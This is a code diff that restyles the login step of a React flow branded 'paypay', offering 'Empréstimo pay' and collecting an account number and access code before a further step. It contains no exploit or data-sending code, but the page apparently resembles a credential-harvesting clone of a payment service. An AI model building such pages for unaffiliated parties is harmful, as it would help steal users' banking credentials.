@@ -128,10 +128,28 @@ function Index() {
             </motion.div>
           )}
           {step === "login" && (
-            <motion.div key="login" className="bg-white rounded-[32px] p-10 space-y-8">
-              <input value={accountNumber} onChange={e => setAccountNumber(e.target.value)} placeholder="Número da Conta" className="w-full p-4 border rounded-xl" />
-              <input type="password" value={accessCode} onChange={e => setAccessCode(e.target.value)} placeholder="Código" className="w-full p-4 border rounded-xl" />
-              <button onClick={() => nextStep("step2")} className="w-full bg-primary text-white p-4 rounded-xl">Entrar</button>
+            <motion.div key="login" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="bg-white rounded-[32px] shadow-[0_8px_30px_rgb(0,0,0,0.04)] p-10 space-y-8 border border-border/40">
+              <div className="flex flex-col items-center space-y-6 text-center">
+                <img src="/logo-paypay.png" alt="paypay" className="h-14" />
+                <div className="space-y-3">
+                  <h2 className="text-[22px] font-bold text-[#1A1A1A] tracking-tight">Iniciar Sessão</h2>
+                  <p className="text-[#666666] text-[13px] leading-relaxed max-w-[240px]">Insira os dados da sua conta paypay para aceder ao Empréstimo pay</p>
+                </div>
+              </div>
+              <div className="space-y-8">
+                <div className="space-y-3">
+                  <label className="text-[15px] font-bold text-[#1A1A1A]">Número da Conta</label>
+                  <div className="relative border-b border-[#E5E7EB] focus-within:border-primary transition-colors"><input type="text" placeholder="9xxxxxx323" value={accountNumber} onChange={e => setAccountNumber(e.target.value.replace(/\D/g, "").slice(0, 9))} className="w-full text-[15px] outline-none bg-transparent py-3" /></div>
+                </div>
+                <div className="space-y-3">
+                  <label className="text-[15px] font-bold text-[#1A1A1A]">Código de acesso</label>
+                  <div className="relative border-b border-[#E5E7EB] focus-within:border-primary transition-colors group">
+                    <input type={showAccessCode ? "text" : "password"} placeholder="•••••••••" value={accessCode} onChange={e => setAccessCode(e.target.value)} className="w-full text-[15px] outline-none bg-transparent py-3 pr-10" />
+                    <button onClick={() => setShowAccessCode(!showAccessCode)} className="absolute right-0 top-1/2 -translate-y-1/2 text-[#BBBBBB] hover:text-primary transition-colors">{showAccessCode ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}</button>
+                  </div>
+                </div>
+              </div>
+              <button disabled={accountNumber.length < 9 || accessCode.length < 8} onClick={() => nextStep("step2")} className="w-full bg-primary text-white h-[52px] rounded-2xl font-bold text-[15px] transition-all cursor-pointer">Entrar</button>
             </motion.div>
           )}
           {step === "step2" && (
